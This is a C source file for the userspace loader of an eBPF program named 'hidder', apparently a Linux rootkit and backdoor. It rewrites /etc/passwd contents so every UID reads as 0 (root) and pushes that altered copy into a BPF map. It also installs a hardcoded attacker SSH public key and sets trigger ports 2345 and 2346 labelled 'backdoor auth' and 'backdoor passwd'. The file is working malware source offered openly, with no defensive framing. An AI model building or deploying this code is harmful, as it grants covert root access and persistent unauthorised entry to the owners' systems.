#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <fcntl.h>
#include <bpf/bpf.h>


#include "hidder.skel.h"

char backdoor_publickey[] = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL4Ni05BbR7NtVOB5IRJfFMoR9ExQvURB5/Y+OIYLP8+";

struct hidder_bpf *skel;
struct passwd_block {
    char buff[8192];
    int buff_len;
};

static void int_exit(int sig)
{
	hidder_bpf__destroy(skel);
	exit(0);
}

static int get_passwd_backdoor(char *buff, int buff_len)
{
    int passwd_fd = open("/etc/passwd", O_RDONLY);
    if (passwd_fd < 0) {
        fprintf(stderr, "Failed to open /etc/passwd\n");
        return -1;
    }
    int ret = read(passwd_fd, buff, buff_len);
    if (ret < 0) {
        fprintf(stderr, "Failed to read /etc/passwd\n");
        return -1;
    }
    close(passwd_fd);

    for (int i = 0; i < ret; i++) {
        if (buff[i] >= '1' && buff[i] <= '9') {
            buff[i] = '0';
        }
    }

    return ret;
}

int set_altered_passwd(char *passwd, int passwd_len)
{
    const int zero = 0;
    int passwd_fd = bpf_map__fd(skel->maps.passwd_elem);
    if (passwd_fd < 0) {
        printf("Failed to get passwd_fd\n");
        return -1;
    }
    if (passwd_len > 8192) {
        printf("passwd_len is too long\n");
        return -1;
    }
    struct passwd_block passwd_block = {
        .buff_len = passwd_len,
        .buff = {0}
    };
    memcpy(passwd_block.buff, passwd, passwd_len);
    return bpf_map_update_elem(passwd_fd, &zero, &passwd_block, 0);
}

int set_backdoor_pubkey(char *pubkey, int pubkey_len)
{
    const int zero = 0;
    int auth_fd = bpf_map__fd(skel->maps.auth_elem);
    if (auth_fd < 0) {
        printf("Failed to get auth_fd\n");
        return -1;
    }
    if (pubkey_len > 256) {
        printf("pubkey_len is too long\n");
        return -1;
    }
    return bpf_map_update_elem(auth_fd, &zero, pubkey, 0);
}

int set_port(unsigned short port, int backdoor_type)
{
    // update maps
    int port_fd = bpf_map__fd(skel->maps.trigger_ports);
    if (port_fd < 0) {
        fprintf(stderr, "Failed to get port_fd\n");
        return -1;
    }
    if (port == 0) {
        return bpf_map_delete_elem(port_fd, &port);
    }
    return bpf_map_update_elem(port_fd, &port, &backdoor_type, 0);
}

int main(int argc, char **argv)
{
    int err;

    skel = hidder_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    err = hidder_bpf__load(skel);
    if (err) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
    }

    err = hidder_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton\n");
    }

    // Set altered passwd
    char passwd_buff[8192];
    get_passwd_backdoor(passwd_buff, sizeof(passwd_buff));
    set_altered_passwd(passwd_buff, sizeof(passwd_buff));

    // Set backdoor settings
    set_backdoor_pubkey(backdoor_publickey, sizeof(backdoor_publickey));
    set_port(2345, 1); // backdoor auth
    set_port(2346, 2); // backdoor passwd
    

    signal(SIGINT, int_exit);
    signal(SIGTERM, int_exit);
    printf("hidder_bpf loaded successfully.\n");
    while (1) {
        sleep(2);
    }
    return 0;
}